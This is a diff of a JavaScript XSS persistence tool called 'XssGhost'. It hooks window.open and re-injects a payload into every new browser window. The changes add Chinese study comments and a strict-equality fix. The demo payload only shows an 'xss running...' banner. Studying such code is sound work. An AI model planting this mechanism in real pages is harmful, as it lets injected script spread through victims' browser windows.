@@ -1,7 +1,9 @@
 var XssGhost = function() {
 
 	function module(id, payload, winList, first) {
+		//保存当前的
 		var window = this;
+
 		// debug
 		window.addEventListener('error', function(e) {
 			alert('err: ' + e.message);
@@ -29,6 +31,7 @@ var XssGhost = function() {
 			var win = mFnWinOpen.apply(this, arguments);
 			if (win) {
 				if (!url || /about:blank/i.test(url)) {
+					//这个不注入
 					win.__xss_blank = true;
 				}
 				welcome(win);
@@ -277,22 +280,23 @@ var XssGhost = function() {
 		}
 	}
 
-
 	function init(opt) {
 		// 不考虑老 IE 浏览器了
 		if (!window.addEventListener) {
 			return;
 		}
-
+		//id=__xss_id_test1
 		var id = '__xss_id_' + opt.id;
+		//已经有了就返回
 		if (id in window) {
 			return;
 		}
+		//赋值为true
 		window[id] = true;
-
+		//执行该payload
 		var payload = opt.payload;
 		payload();
-
+		//调用module
 		module(id, payload + '', [window], true);
 	}
 
@@ -307,15 +311,13 @@ XssGhost.init({
 	id: 'test1',
 	payload: function() {
 		//console.warn('xss run');
-
 		function show() {
 			var div = document.createElement('div');
 			div.innerHTML = 'xss running...';
 			div.style.cssText = 'position:fixed; top:0; right:0; color:red; background:#000; font-size:40px; line-height:40px; z-index:999999';
 			document.body.appendChild(div);
 		}
-
-		if (document.readyState == 'complete') {
+		if (document.readyState === 'complete') {
 			show();
 		} else {
 			window.addEventListener('DOMContentLoaded', show);
